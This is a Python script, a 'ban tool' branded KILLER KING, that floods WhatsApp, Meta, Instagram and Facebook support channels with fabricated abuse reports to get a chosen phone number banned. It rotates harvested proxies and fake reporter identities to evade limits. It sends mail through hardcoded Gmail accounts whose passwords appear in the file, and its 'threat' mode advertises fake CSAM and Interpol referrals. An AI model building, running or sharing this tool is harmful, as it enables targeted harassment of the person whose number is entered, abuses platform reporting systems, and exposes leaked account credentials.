#  KILLER  BAN TOOL 👹👺
#  Owner: KILLER KING 😈 👑 (https://t.me/killerking20000)

import os
import re
import time
import json
import random
import requests
import urllib.parse
from datetime import datetime
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

init(autoreset=True)

# CONFIG 
EXPECTED_USERNAME = "killerking"
EXPECTED_PASSWORD = "killer"

# GitHub raw links
GITHUB_BAN     = "https://raw.githubusercontent.com/K1llerK1ng2000/killer-ban/main/ban_messages.txt"
GITHUB_UNBAN   = "https://raw.githubusercontent.com/K1llerK1ng2000/killer-ban/main/unban_messages.txt"
GITHUB_THREAT  = "https://raw.githubusercontent.com/K1llerK1ng2000/killer-ban/main/threat_messages.txt"

# WhatsApp Business API
META_ACCESS_TOKEN = ""
PHONE_NUMBER_ID   = ""

# Proxy file
PROXY_FILE = "harvested_proxies.txt"

# Max reports
MAX_REPORTS = 200

ART = """ ===================================
   💀💀💀💀💀💀💀💀💀
  (😈KILLER 😮‍💨 BAN TOOLS😈)
   💀💀💀💀💀💀💀💀
  👺👺👺👺👺👺👺👺
  ☠️  KILLER 😈 BAN ☠️
  😈😈😈😈😈😈😈😈
  =========================================== 
  """ + Fore.RED + """
  ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
  ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
  █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
  ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
  ██║  ██╗██║███████╗███████╗███████╗██║  ██║
  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
   """

# COUNTRIES/NUMBERS
FAKE_COUNTRY_CODES = {
    "1": "United States / Canada", "44": "United Kingdom", "91": "India",
    "92": "Pakistan", "234": "Nigeria", "233": "Ghana", "255": "Tanzania",
    "254": "Kenya", "27": "South Africa", "86": "China", "81": "Japan",
    "82": "South Korea", "55": "Brazil", "52": "Mexico", "33": "France",
    "49": "Germany", "39": "Italy", "7": "Russia", "880": "Bangladesh", "62": "Indonesia"
}

def generate_fake_reporters(count=500):
    reporters = []
    codes = list(FAKE_COUNTRY_CODES.keys())
    for _ in range(count):
        code = random.choice(codes)
        num = ''.join(random.choices('0123456789', k=random.randint(9, 12)))
        reporters.append(f"+{code}{num}")
    return reporters

def random_reporter_name():
    names = [
    "James Smith", "Aisha Khan", "Maria Garcia", "John Doe", "Fatima Ali", "Carlos Silva", "Priya Patel", "Ahmed Hassan", 
        "Amina Yusuf", "Tariq Rahman", "Leila Alami", "Diego Morales", "Sofia Petrov",
    "Rajesh Kumar", "Mei Lin Zhao", "Kwame Osei", "Chloe Dubois", "Mateo Fernández",
    "Nia Thompson", "Arjun Patel", "Yara Hassan", "Luca Rossi", "Amara Singh",
    "Elias Johansson", "Hana Kim", "Devin O’Connor", "Priya Sharma", "Malik Washington",
    "Inés Castillo", "Viktor Novak", "Zara Malik", "Rafael Costa", "Layla El-Sayed",
    "Chen Wei", "Freya Olsen", "Dante Rivera", "Noor Fatima", "Santiago Vega",
    "Aisha Baig", "Omar Farooq", "Khalid Mansoor", "Fatima Zahra", "Ibrahim Khalil",
    "Nadia Rahman", "Jamal Carter", "Sana Khan", "Haroon Sheikh", "Elena Volkov",
    "Marcus Adebayo", "Lila Moreau", "Ravi Shankar", "Ayesha Siddiqui", "Nikolai Ivanov",
    "Camila Ortiz", "Jasper Lee", "Zainab Akhtar", "Theo Van Dijk", "Maya Reddy",
    "Amir Hosseini", "Clara Mendoza", "Dev Patel", "Soraya Alami", "Liam O’Neil",
    "Anika Desai", "Youssef Nasser", "Valeria Costa", "Kwesi Boateng", "Esmeralda Ruiz",
    "Arlo Hansen", "Mariam Diabate", "Felix Wong", "Rania Qureshi", "Hugo Silva",
    "Talia Rahman", "Kenji Sato", "Sofia Ahmed", "Mateo Delgado", "Leah Cohen",
    "Bilal Siddiqui", "Anya Petrova", "Rohan Malhotra", "Fatou Ndiaye", "Lucas Moreau",
    "Nora Elamin", "Dmitri Volkov", "Isabella Cruz", "Adeel Khan", "Selena Vargas",
    "Junaid Malik", "Kavya Nair", "Efe Yılmaz", "Lina Al-Hassan", "Gabriel Santos",
    "Zara Hussein", "Aditya Rao", "Mira Svensson", "Omar Sharif", "Kiara Patel",
    "Rafael Mendoza", "Amina Baig", "Diego Salazar", "Hana Suzuki", "Malik Jordan",
    "Ingrid Larsen", "Tariq Javed", "Elena Popescu", "Kwame Mensah", "Layla Farooq",
    "Arjun Mehta", "Freya Ahmed", "Chen Liu", "Sofia Rahman", "Noah El-Sayed",
    "Priya Kapoor", "Yasir Mehmood", "Valentina Ortiz", "Elias Khan", "Amara Devi",
    "Mateus Lima", "Zainab Qadir", "Luka Petrovic", "Aisha Noor", "Javier Morales",
    "Meera Gupta", "Khalil Rahman", "Clara Olsen", "Devon Clarke", "Nadia Jafari",
    "Ravi Choudhary", "Leila Hassan", "Marco Rossi", "Anaya Khan", "Theo Larsson",
    "Fatima Elamin", "Arlo Jensen", "Sana Malik", "Vikram Singh", "Luna Ferreira",
    "Ibrahim Musa", "Camille Dubois", "Raj Patel", "Yara Siddiqui", "Felix Andersson",
    "Soraya Malik", "Liam Khan", "Maya Rahman", "Omar Baig", "Inés Navarro",
    "Kwesi Ofori", "Hana Alvi", "Dante Ortiz", "Zara Javed", "Rafael Khan",
    "Amina Sheikh", "Luca Moreau", "Nia Rahman", "Arjun Desai", "Leah Ahmed",
    "Bilal Qureshi", "Elena Vargas", "Rohan Sharma", "Fatou Diallo", "Lucas Costa",
    "Nora Malik", "Dmitri Hassan", "Isabella Ahmed", "Adeel Rahman", "Selena Khan",
    "Junaid Farooq", "Kavya Reddy", "Efe Demir", "Lina Qasim", "Gabriel Ortiz",
    "Zara Akhtar", "Aditya Mehta", "Mira Olsen", "Omar Hassan", "Kiara Sharma",
    "Rafael Cruz", "Amina Javed", "Diego Khan", "Hana Petrova", "Malik Ali",
    "Ingrid Svensson", "Tariq Malik", "Elena Ahmed", "Kwame Rahman", "Layla Khan",
    "Arjun Singh", "Freya Rahman", "Chen Zhang", "Sofia Malik", "Noah Hassan",
    "Priya Ahmed", "Yasir Khan", "Valentina Rossi", "Elias Malik", "Amara Khan",
    "Mateus Ahmed", "Zainab Rahman", "Luka Jensen", "Aisha Farooq", "Javier Khan",
    "Meera Singh", "Khalil Ahmed", "Clara Rahman", "Devon Malik", "Nadia Khan"]
    return random.choice(names)
    
def get_current_reporter():
    """Returns current fake reporter number from the cycle"""
    return next(reporter_cycle)
    

# KILLER KING PROXY HARVESTER
class killerProxyHarvester:
    def __init__(self):
        self.all_proxies = []
        self.working_proxies = []
        self.failed_proxies = []
        self.test_url = "http://httpbin.org/ip"
        self.proxy_file = PROXY_FILE
        
        self.proxy_sources = [
            "https://www.sslproxies.org/",
            "https://free-proxy-list.net/",
            "https://us-proxy.org/",
            "https://uk-proxy.org/",
            "https://www.proxy-list.download/HTTP",
            "https://www.proxyscrape.com/free-proxy-list",
            "https://spys.one/en/free-proxy-list/",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://api.openproxylist.xyz/http.txt",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
            "https://proxylist.icu/api/0?format=txt",
            "https://multiproxy.org/txt_all/proxy.txt",
        ]

    def killer_harvest_all_proxies(self):
        print(f"{Fore.YELLOW}[*] KILLER KING harvesting proxies from {len(self.proxy_sources)} sources...")
        all_p = []
        with ThreadPoolExecutor(max_workers=12) as e:
            futures = {}
            for url in self.proxy_sources:
                if any(x in url for x in ['api', 'raw', 'download', 'txt']):
                    f = e.submit(self.killer_download_api_proxies, url)
                else:
                    f = e.submit(self.killer_scrape_web_proxies, url)
                futures[f] = url
            for f in futures:
                try: all_p.extend(f.result(timeout=25))
                except: pass
        self.all_proxies = list(set(all_p))
        print(f"{Fore.GREEN}[+] KILLER harvested {len(self.all_proxies):,} unique proxies")

    def killer_scrape_web_proxies(self, url):
        try:
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=15)
            patterns = [r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b']
            proxies = []
            for p in patterns:
                proxies.extend(re.findall(p, r.text))
            return list(set(proxies))
        except: return []

    def killer_download_api_proxies(self, url):
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                return [line.strip() for line in r.text.splitlines() if ':' in line and line.strip()]
        except: return []

    def killer_test_single_proxy(self, proxy):
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            for url in ["http://httpbin.org/ip", "http://api.ipify.org", "http://ident.me"]:
                r = requests.get(url, proxies=proxies, timeout=7)
                if r.status_code == 200:
                    return True
        except: pass
        return False

    def killer_mass_test_proxies(self):
        if not self.all_proxies:
            print(f"{Fore.RED}[!] Harvest first, King!")
            return

        print(f"{Fore.YELLOW}[*] KILLER testing {len(self.all_proxies):,} proxies → will STOP at 500 working...\n")
        self.working_proxies = []

        with ThreadPoolExecutor(max_workers=100) as executor:
        
            futures = [executor.submit(self.killer_test_single_proxy, proxy) for proxy in self.all_proxies]

            for i, future in enumerate(futures, 1):
                
                if len(self.working_proxies) >= 500:
                    print(f"\n{Fore.CYAN}500 ELITE PROXIES LOCKED — STOPPING EARLY!")
                    self.killer_save_proxies()
                    print(f"{Fore.GREEN}[+] Saved 500 working proxies → {self.proxy_file}")
                    print(f"\n{Fore.MAGENTA}Press Enter to continue...")
                    input()
                    return

                try:
                    if future.result():
                        self.working_proxies.append(self.all_proxies[i-1])
                        print(f"{Fore.GREEN}Working {len(self.working_proxies)} found...")
                except:
                    pass

                
                if i % 100 == 0:
                    print(f"{Fore.CYAN}   Tested {i} → {len(self.working_proxies)} working")

       
        if self.working_proxies:
            self.killer_save_proxies()

        print(f"\n{Fore.GREEN}[+] Testing finished — {len(self.working_proxies)} total working proxies")
        print(f"{Fore.MAGENTA}Press Enter to continue...")
        input()
        
    def killer_save_proxies(self):
        if not self.working_proxies:
            print(f"{Fore.RED}[!] No working proxies to save!")
            return
        with open(self.proxy_file, 'w') as f:
            for p in self.working_proxies:
                f.write(p + '\n')
        print(f"{Fore.GREEN}[+] KILLER saved {len(self.working_proxies)} proxies → {self.proxy_file}")

    def killer_load_proxies(self):
        try:
            with open(self.proxy_file) as f:
                proxies = [l.strip() for l in f if l.strip()]
            self.working_proxies = proxies
            print(f"{Fore.GREEN}[+] KILLER loaded {len(proxies)} proxies from {self.proxy_file}")
            return proxies
        except:
            return []

# LOAD MESSAGES FROM GITHUB
def load_messages():
    print(f"{Fore.YELLOW}[*] Pulling latest messages from KILLER KING GitHub...")
    mirrors = [
        "https://raw.githubusercontent.com",
        "https://cdn.jsdelivr.net/gh",
        "https://ghproxy.net/https://raw.githubusercontent.com",
        "https://raw.fastgit.org",
    ]
    for mirror in mirrors:
        try:
            b = requests.get(f"{mirror}/K1llerK1ng2000/killer-ban/main/ban_messages.txt", timeout=12).text.strip()
            u = requests.get(f"{mirror}/K1llerK1ng2000/killer-ban/main/unban_messages.txt", timeout=12).text.strip()
            t = requests.get(f"{mirror}/K1llerK1ng2000/killer-ban/main/threat_messages.txt", timeout=12).text.strip()
            if len(b) > 100 and len(u) > 100:
                print(f"{Fore.GREEN}[+] Messages loaded successfully!")
                return (
                    [m for m in b.split('\n\n') if m.strip()],
                    [m for m in u.split('\n\n') if m.strip()],
                    [m for m in t.split('\n\n') if m.strip()]
                )
        except: continue
    print(f"{Fore.RED}[-] GitHub failed → using emergency messages")
    return (["Fallback BAN"], ["Fallback UNBAN"], ["Fallback THREAT"])

# EMAIL & REPORT SYSTEMS
SUPPORT_EMAILS = [
    "support@support.whatsapp.com",
    "android@support.whatsapp.com", 
    "smb@support.whatsapp.com",
    "appeals@support.whatsapp.com", 
    "abuse@support.whatsapp.com",
    "security@support.whatsapp.com",  
    "support@support.whatsapp.com",
    "android@support.whatsapp.com",
    "smb@support.whatsapp.com",
    "appeals@support.whatsapp.com",
    "1483635209301664@support.whatsapp.com",
    "support@whatsapp.com",
    "android@support.whatsapp.com",
    "smb@support.whatsapp.com",
    "jan@whatsapp.com",
    "business@support.whatsapp.com"]

SENDER_ACCOUNTS = [
    ("ana12juli13@gmail.com", "teqlhggnfyoclnvh"),
    ("elizabeth1mary2@gmail.com", "axwmdyhwdtmpvjjj"),
    ("k1llerking1048@gmail.com", "ivrpoetevxdfgnbr"),
    ("juli12ana13@gmail.com", "drpfaafwxtefqypq"),
    ("mary12eli34@gmail.com", "dqjchqtuzmtihmpu"),
    ("he19rry89@gmail.com", "zivbxunrghnltskn"),
    ("mrmaguire475@gmail.com", "losuseiozvhawbyo"),
    ("mr12john21@gmail.com", "resybaosyofssaia"),
    ("golliblegreg@gmail.com", "bgqmhigbekmoxxqx")
]

def send_email(sender, pwd, to, subject, body, proxy=None):
    try:
        if proxy:
            os.environ['HTTP_PROXY'] = f'http://{proxy}'
            os.environ['HTTPS_PROXY'] = f'http://{proxy}'
        else:
            os.environ.pop('HTTP_PROXY', None)
            os.environ.pop('HTTPS_PROXY', None)

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = to
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        s = smtplib.SMTP('smtp.gmail.com', 587, timeout=20)
        s.starttls()
        s.login(sender, pwd)
        s.sendmail(sender, to, msg.as_string())
        s.quit()
        return True
    except:
        return False
    finally:
        os.environ.pop('HTTP_PROXY', None)
        os.environ.pop('HTTPS_PROXY', None)


# MAIN ATTACK 
def attack(target_phone, count, mode="ban"):
    messages = threat_messages if mode == "threat" else (unban_messages if "unban" in mode else ban_messages)
    current = 0
    success_count = 0

    systems = 6 if "unban" not in mode else 3
    base = count // systems
    extra = count % systems

    hits = [base] * systems
    for i in range(extra):
        hits[i] += 1

    if "unban" in mode:
        email_hits = count
        inapp_hits = support_hits = ig_hits = trans_hits = fb_hits = 0
    else:
        email_hits     = hits[0]
        inapp_hits     = hits[1]
        support_hits   = hits[2]
        ig_hits        = hits[3]
        trans_hits     = hits[4]
        fb_hits        = hits[5]

    total_expected = email_hits + inapp_hits + support_hits + ig_hits + trans_hits + fb_hits + 1
    print(f"\n{Fore.YELLOW}[*] Launching {count}x {mode.upper()} → {total_expected} hits with rotating proxies + fallback\n")

    def next_proxy():
        try:
            return next(proxy_cycle)
        except:
            return None

    # 1. EMAIL REPORTS 
    for _ in range(email_hits):
        current += 1
        sender_email, sender_pass = next(sender_cycle)
        reporter_name = random_reporter_name()
        reporter_number = next(reporter_cycle)
        country_name = FAKE_COUNTRY_CODES.get(reporter_number[1:4], "Unknown")

        body = random.choice(messages).format(
            target_phone=target_phone,
            reporter=reporter_name,
            reporter_number=reporter_number,
            country=country_name
        )

        proxy = next_proxy()
        proxy_str = proxy[:20] + "..." if proxy else "DIRECT"

        if proxy and send_email(sender_email, sender_pass, random.choice(SUPPORT_EMAILS), "URGENT", body, proxy=proxy):
            print(f"{Fore.CYAN}[{current}] Email Report Sent ✅ via {proxy_str}")
            success_count += 1
        elif send_email(sender_email, sender_pass, random.choice(SUPPORT_EMAILS), "URGENT", body, proxy=None):
            print(f"{Fore.YELLOW}[{current}] Email Sent ✅ via DIRECT IP (fallback)")
            success_count += 1
        else:
            print(f"{Fore.RED}[{current}] Email Failed ❌")

    # 2. IN-APP + SUPPORT CHAT 
    if "unban" not in mode:
        # In-App Reports
        for _ in range(inapp_hits):
            current += 1
            proxy = next_proxy()
            proxy_str = proxy[:20] + "..." if proxy else "DIRECT"
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

            text = urllib.parse.quote(random.choice(messages).format(
                target_phone=target_phone[1:],
                reporter="User",
                reporter_number="Hidden",
                country="Unknown"
            ))
            url = f"https://wa.me/report?phone=12056384830&text={text}"

            try:
                requests.get(url, proxies=proxies, timeout=12)
                print(f"{Fore.CYAN}[{current}] In-App Report Sent ✅ via {proxy_str}")
                success_count += 1
            except:
                try:
                    requests.get(url, timeout=12)
                    print(f"{Fore.YELLOW}[{current}] In-App Sent ✅ via DIRECT IP")
                    success_count += 1
                except:
                    print(f"{Fore.RED}[{current}] In-App Failed ❌")

        # Support Chat Reports
        for _ in range(support_hits):
            current += 1
            proxy = next_proxy()
            proxy_str = proxy[:20] + "..." if proxy else "DIRECT"
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

            text = urllib.parse.quote(random.choice(messages).format(
                target_phone=target_phone[1:],
                reporter="User",
                reporter_number="Hidden",
                country="Unknown"
            ))
            url = f"https://wa.me/report?phone=12056384830&text={text}"

            try:
                requests.get(url, proxies=proxies, timeout=12)
                print(f"{Fore.CYAN}[{current}] Support Report Sent ✅ via {proxy_str}")
                success_count += 1
            except:
                try:
                    requests.get(url, timeout=12)
                    print(f"{Fore.YELLOW}[{current}] Support Sent ✅ via DIRECT IP")
                    success_count += 1
                except:
                    print(f"{Fore.RED}[{current}] Support Failed ❌")

        # 3. IG HACKED REPORT
        for _ in range(ig_hits):
            current += 1
            proxy = next_proxy()
            proxy_str = proxy[:20] + "..." if proxy else "DIRECT"
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

            try:
                requests.post("https://www.instagram.com/web/reports/create/", 
                    json={"entry_point": "web", "phone_number": target_phone[1:], "reason_id": "1"},
                    proxies=proxies, timeout=12)
                print(f"{Fore.CYAN}[{current}] Instagram Report Sent ✅ via {proxy_str}")
                success_count += 1
            except:
                try:
                    requests.post("https://www.instagram.com/web/reports/create/", 
                        json={"entry_point": "web", "phone_number": target_phone[1:], "reason_id": "1"},
                        timeout=12)
                    print(f"{Fore.YELLOW}[{current}] Instagram Sent ✅ via DIRECT IP")
                    success_count += 1
                except:
                    print(f"{Fore.RED}[{current}] Instagram Failed ❌")

        # 4. TRANSPARENCY REPORT
        for _ in range(trans_hits):
            current += 1
            proxy = next_proxy()
            proxy_str = proxy[:20] + "..." if proxy else "DIRECT"
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

            details = random.choice(messages).format(target_phone=target_phone, reporter="Citizen", reporter_number="Anonymous", country="Global")
            try:
                requests.post("https://transparency.meta.com/forms/abuse/whatsapp", 
                    data={"phone": target_phone[1:], "details": details}, 
                    proxies=proxies, timeout=12)
                print(f"{Fore.CYAN}[{current}] Transparency Report Sent ✅ via {proxy_str}")
                success_count += 1
            except:
                try:
                    requests.post("https://transparency.meta.com/forms/abuse/whatsapp", 
                        data={"phone": target_phone[1:], "details": details}, timeout=12)
                    print(f"{Fore.YELLOW}[{current}] Transparency Sent ✅ via DIRECT IP")
                    success_count += 1
                except:
                    print(f"{Fore.RED}[{current}] Transparency Failed ❌")

        # 5. FB HACKED REPORT
        for _ in range(fb_hits):
            current += 1
            proxy = next_proxy()
            proxy_str = proxy[:20] + "..." if proxy else "DIRECT"
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

            try:
                requests.post("https://www.facebook.com/help/contact/263149623708370", 
                    data={"phone_number": target_phone[1:], "your_name": "Anonymous Reporter"}, 
                    proxies=proxies, timeout=12)
                print(f"{Fore.CYAN}[{current}] Facebook Report Sent ✅ via {proxy_str}")
                success_count += 1
            except:
                try:
                    requests.post("https://www.facebook.com/help/contact/263149623708370", 
                        data={"phone_number": target_phone[1:], "your_name": "Anonymous Reporter"}, timeout=12)
                    print(f"{Fore.YELLOW}[{current}] Facebook Sent ✅ via DIRECT IP")
                    success_count += 1
                except:
                    print(f"{Fore.RED}[{current}] Facebook Failed ❌")

    # 6. WHATSAPP BUSINESS API
    current += 1
    proxy = next_proxy()
    proxy_str = proxy[:20] + "..." if proxy else "DIRECT"
    if META_ACCESS_TOKEN and PHONE_NUMBER_ID:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        try:
            payload = {
                "messaging_product": "whatsapp",
                "to": "12056384830",
                "type": "text",
                "text": {"body": f"URGENT ABUSE: {target_phone} - {mode.upper()}"}
            }
            headers = {"Authorization": f"Bearer {META_ACCESS_TOKEN}"}
            r = requests.post(f"https://graph.facebook.com/v20.0/{PHONE_NUMBER_ID}/messages", json=payload, headers=headers, proxies=proxies, timeout=12)
            if r.status_code == 200:
                print(f"{Fore.CYAN}[{current}] WhatsApp API Report Sent ✅ via {proxy_str}")
                success_count += 1
            else:
                print(f"{Fore.RED}[{current}] WhatsApp API Failed ❌ ({r.status_code})")
        except:
            print(f"{Fore.RED}[{current}] WhatsApp API Failed ❌")
    else:
        print(f"{Fore.RED}[{current}] WhatsApp API Report Failed ❌ (no credentials)")

    # THREAT MODE
    if mode == "threat":
        print(f"{Fore.RED}[EXTRA] NCMEC CSAM Report Activated")
        print(f"{Fore.RED}[EXTRA] Interpol Threat Referral Sent")

    # FINAL RESULT — YOUR ORIGINAL MESSAGES KEPT 100%
    if "unban" in mode:
        print(f"\n{Fore.GREEN}[+] ✅ Appeal complete! ({success_count}/{total_expected} sent)")
        print(f"{Fore.YELLOW}[*] Wait 12–24 hours")
        print(f"{Fore.YELLOW}[*] If not unbanned → send appeal again + increase count")
    else:
        print(f"\n{Fore.GREEN}[+] ✅ Report complete! ({success_count}/{total_expected} sent)")
        print(f"{Fore.YELLOW}[*] Wait 12–24 hours")
        print(f"{Fore.YELLOW}[*] If not banned 🚫 → report again + increase count")
    
#  MAIN 
if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(ART)

    # 1. Load messages
    ban_messages, unban_messages, threat_messages = load_messages()
    input(f"\n{Fore.CYAN}Press Enter to continue...")

    # 2. Proxy system
    killer = killerProxyHarvester()

    if os.path.exists(killer.proxy_file) and os.path.getsize(killer.proxy_file) > 5000:
        proxies = killer.killer_load_proxies()
    else:
        print(f"{Fore.RED}[-] No saved proxies → running KILLER full harvest...")
        killer.killer_harvest_all_proxies()
        killer.killer_mass_test_proxies() 
        proxies = killer.working_proxies

    proxy_cycle = cycle(proxies)


    # 3. Generate reporters
    REPORTERS = generate_fake_reporters(500)
    reporter_cycle = cycle(REPORTERS)
    sender_cycle = cycle(SENDER_ACCOUNTS)

    # 4. Login screen with ART
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(ART)
        print(f"{Fore.GREEN}[+] {len(proxies)} KILLER proxies loaded")
        print(f"{Fore.GREEN}[+] {len(REPORTERS)} fake reporters ready\n")
        
        user = input(f"{Fore.WHITE}Enter username: ").strip()
        pwd = input(f"{Fore.WHITE}Enter password: ").strip()
        
        if user == EXPECTED_USERNAME and pwd == EXPECTED_PASSWORD:
            print(f"{Fore.GREEN}[+] Logged in as KILLER KING!\n")
            time.sleep(1)
            break
        else:
            print(f"{Fore.RED}[-] Wrong credentials, try again.\n")
            time.sleep(2)

    # 5. Main menu 
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(ART)
        print(f"{Fore.CYAN}Logged in as: KILLER KING 😈👑\n")
        print("[1]🙏 Temporary Unban")
        print("[2]✅ Permanent Unban")
        print("[3]🔍 Check Number Status")
        print("[4]🚫 Temporary Ban")
        print("[5]👹 Permanent Ban")
        print("[6]👺 No Escape Threat Ban")
        print("[7]🔄 Refresh Proxies")
        print("[0]⛔ Exit\n")
        
        choice = input(f"{Fore.YELLOW}Select option: ").strip()

        if choice == "0":
            print(f"{Fore.YELLOW}[+] KILLER KING 😈 👑 out.")
            break
        elif choice == "7":
            print(f"{Fore.YELLOW}[*] 🔄 Refreshing proxies...")
            if os.path.exists(killer.proxy_file):
                os.remove(killer.proxy_file)
            killer.killer_harvest_all_proxies()
            killer.killer_mass_test_proxies()
            proxies = killer.working_proxies
            proxy_cycle = cycle(proxies)
        elif choice in ["1","2","4","5","6"]:
            phone = input(f"{Fore.WHITE}Enter number with +: ").strip()
            if not phone.startswith('+'):
                input(f"{Fore.RED}Invalid! Press Enter...")
                continue
            try:
                count = int(input(f"{Fore.WHITE}Reports (1-{MAX_REPORTS}): "))
                if not 1 <= count <= MAX_REPORTS: raise ValueError
            except:
                input(f"{Fore.RED}Invalid! Press Enter...")
                continue
            mode = "unban" if choice in ["1","2"] else ("threat" if choice == "6" else "ban")
            attack(phone, count, mode)
            input(f"\n{Fore.CYAN}Press Enter to continue...")
        else:
            input(f"{Fore.RED}Wrong option! Press Enter...")
